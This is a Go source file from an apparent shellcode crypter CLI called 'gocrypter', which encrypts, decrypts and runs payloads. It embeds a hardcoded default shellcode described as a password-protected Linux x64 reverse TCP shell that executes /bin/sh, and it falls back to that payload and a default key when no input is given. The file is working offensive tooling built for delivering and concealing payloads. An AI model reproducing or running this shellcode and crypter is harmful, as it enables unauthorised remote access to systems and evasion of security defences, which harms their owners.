package cli

import (
	"errors"
	"fmt"
	"io/ioutil"
	"os"
	"time"
)

var (
	DEFAULT_OUT_FILE = "gocrypter."
	DEFAULT_KEY      = []byte("Alan @syscall59 ")

	// Default shellcode taken from here:
	// Writeup : https://medium.com/syscall59/writing-a-password-protected-reverse-shell-linux-x64-5f4d3a28d91a
	// Source Code : https://github.com/alanvivona/pwnshop/blob/master/src/0x0E-SLAE64-2-reverse-tcp-auth/reverse-tcp-with-auth.nasm
	DEFAULT_SHELLCODE = []byte{0x6a, 0x29, 0x58, 0x99, 0x6a, 0x02, 0x5f, 0x6a, 0x01, 0x5e, 0x0f, 0x05, 0x49, 0x89, 0xc7, 0x48, 0x97, 0x48, 0xb9, 0xfe, 0xff, 0xee, 0xa3, 0x80, 0xff, 0xff, 0xfe, 0x48, 0xf7, 0xd9, 0x51, 0x48, 0x89, 0xe6, 0x6a, 0x10, 0x5a, 0x6a, 0x2a, 0x58, 0x0f, 0x05, 0x48, 0x31, 0xc0, 0x4c, 0x89, 0xff, 0x6a, 0x04, 0x5a, 0x48, 0x29, 0xd4, 0x48, 0x89, 0xe6, 0x0f, 0x05, 0x48, 0xb8, 0x45, 0x49, 0x4e, 0x21, 0x4c, 0x45, 0x54, 0x4d, 0x48, 0x89, 0xf7, 0x48, 0xaf, 0x75, 0xde, 0x4c, 0x89, 0xff, 0x6a, 0x02, 0x5e, 0x6a, 0x21, 0x58, 0x0f, 0x05, 0x48, 0xff, 0xce, 0x79, 0xf6, 0x48, 0x31, 0xd2, 0x52, 0x48, 0xbb, 0x2f, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x53, 0x48, 0x89, 0xe7, 0x52, 0x48, 0x89, 0xe2, 0x57, 0x48, 0x89, 0xe6, 0x6a, 0x3b, 0x58, 0x0f, 0x05}

	ACTIONS_FULL      = []string{"--encrypt", "--decrypt", "--run"}
	ACTIONS_SMALL     = []string{"-e", "-d", "-r"}
	ACTIONS_BSD_FULL  = []string{"encrypt", "decrypt", "run"}
	ACTIONS_BSD_SMALL = []string{"e", "d", "r"}
)

func showUsageMessage() {
	fmt.Println("Usage: gocrypt {action} {key} {file}")
	fmt.Printf("Available actions are: 'Encrypt payload', 'Decrypt payload', and 'Descrip and Run'\n")
	fmt.Printf("Valid ways of providing the actions are: %s %s %s %s\n", ACTIONS_FULL, ACTIONS_SMALL, ACTIONS_BSD_FULL, ACTIONS_BSD_SMALL)
}

// ParseUserInput ...
func ParseUserInput() ([]byte, string, int, error) {

	if len(os.Args) != 4 {
		showUsageMessage()
		if len(os.Args) == 1 {
			fmt.Println("Demo mode!")
		} else {
			return nil, "", 0, errors.New("wrong number of arguments. expected 3")
		}
	}

	actionKey, err := getAction(os.Args)
	if err != nil {
		return nil, "", 0, err
	}

	key, err := getKey(os.Args)
	if err != nil {
		return nil, "", 0, errors.New("not a valid password. lenght should be 16, 24 or 32")
	}

	shellcode, err := getShellcode(os.Args)
	if err != nil {
		return nil, "", 0, err
	}

	return shellcode, key, actionKey, nil
}

func getAction(args []string) (int, error) {
	action := ""
	if len(args) > 1 {
		action = args[1]
	}
	actionKey := 0
	if len(action) > 0 {
		isActionValid := false
		actionTypes := [][]string{ACTIONS_FULL, ACTIONS_SMALL, ACTIONS_BSD_FULL, ACTIONS_BSD_SMALL}
		for _, actionType := range actionTypes {
			for actionIndex, validAction := range actionType {
				if action == validAction {
					isActionValid = true
					actionKey = actionIndex
					break
				}
			}
		}
		if !isActionValid {
			return 0, errors.New("action not valid")
		}
	}
	return actionKey, nil
}

func getKey(args []string) (string, error) {
	key := ""
	if len(args) > 2 {
		key = args[2]
	}
	keyLen := len(key)
	if keyLen == 0 {
		fmt.Printf("Falling into default key: %s \n", DEFAULT_KEY)
		key = string(DEFAULT_KEY)
	} else {
		if keyLen > 0 && keyLen != 16 && keyLen != 24 && keyLen != 32 {
			return "", errors.New("not a valid password. lenght should be 16, 24 or 32")
		}
	}
	return key, nil
}

func getShellcode(args []string) ([]byte, error) {
	shellcode := []byte("")
	if len(args) > 2 {
		shellcodeProvidedInput := args[3]
		// Provided input is a file
		fmt.Printf("Reading from file at %s\n", shellcodeProvidedInput)
		data, err := ioutil.ReadFile(shellcodeProvidedInput)
		if err != nil {
			return nil, err
		}
		shellcode = data
	}
	shellcodeLen := len(shellcode)
	if shellcodeLen == 0 {
		fmt.Println("Falling into default shellcode payload (password protected reverse shell)")
		shellcode = DEFAULT_SHELLCODE
	}
	return shellcode, nil
}

// SaveResult ...
func SaveResult(data []byte) error {
	timeString := time.Now().Format("150405")
	fileName := DEFAULT_OUT_FILE + timeString + ".out"
	err := ioutil.WriteFile(fileName, data, 777)
	if err != nil {
		return err
	}
	fmt.Printf("Saved to %s\n", fileName)
	return nil
}
